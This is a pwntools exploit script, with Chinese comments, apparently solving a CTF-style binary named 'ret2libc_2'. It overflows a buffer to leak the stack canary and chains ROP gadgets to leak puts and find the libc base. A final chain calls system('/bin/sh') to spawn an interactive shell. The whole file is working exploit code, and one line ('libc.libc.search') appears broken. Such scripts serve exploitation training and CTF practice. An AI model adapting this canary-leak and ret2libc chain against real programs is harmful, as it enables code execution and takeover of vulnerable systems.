from pwn import *
#from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
pwnfile = './ret2libc_2'

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = process(pwnfile)
elf = ELF(pwnfile)
padding = 0x90

def debug():
	gdb.attach(io,"b *0x04009F9")
	pause()
	


# 将中间全部填充字符再打印以泄漏canary
io.sendlineafter('>> ', '1')
io.sendline(b'a'*0x88) # sendline ===> 多一个\n


io.sendlineafter('>> ', '2')
io.recvuntil('aaaaaa\n')
canary = u64(io.recv(7).rjust(8, b'\x00'))			##ljust  rjust

log.success("canary:"+hex(canary))
#print()
debug()




# 泄漏libc
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
pop_rdi_ret = 0x400a93
main_addr = 0x400908
io.sendlineafter('>> ', '1')
#payload = flat([cyclic(padding-0x8), canary, 0xdeadbeef,pop_rdi_ret, puts_got, puts_plt, main_addr])		# 自动为每个参数添加p64()
payload = b'a'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendline(payload)  # 此时程序回到一次新的main调用，需退出到最开始处 
io.sendlineafter(">>", '3')
leak_puts = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success("puts:"+hex(leak_puts))


#libc = LibcSearcher('puts', leak_puts)

'''
libc_base = leak_puts-libc.dump('puts')
system = libc_base+libc.dump('system')
bin_sh = libc_base+libc.dump('str_bin_sh')

'''
libc_base = leak_puts-libc.sym['puts']
system = libc_base+libc.sym['system']
bin_sh = libc_base+libc.libc.search(b'/bin/sh').__next__() 

# shell
io.sendlineafter('>> ', '1')
#payload = flat([cyclic(padding-0x8), canary,0xdeadbeef, pop_rdi_ret, bin_sh,pop_rdi_ret+1, system])
payload = b'a'*0x88 + p64(canary) + p64(0xdeadbeef) + p64(pop_rdi_ret) + p64(bin_sh) + p64(pop_rdi_ret+1) + p64(system)
io.sendline(payload)
io.sendlineafter(">>", '3')
io.interactive()
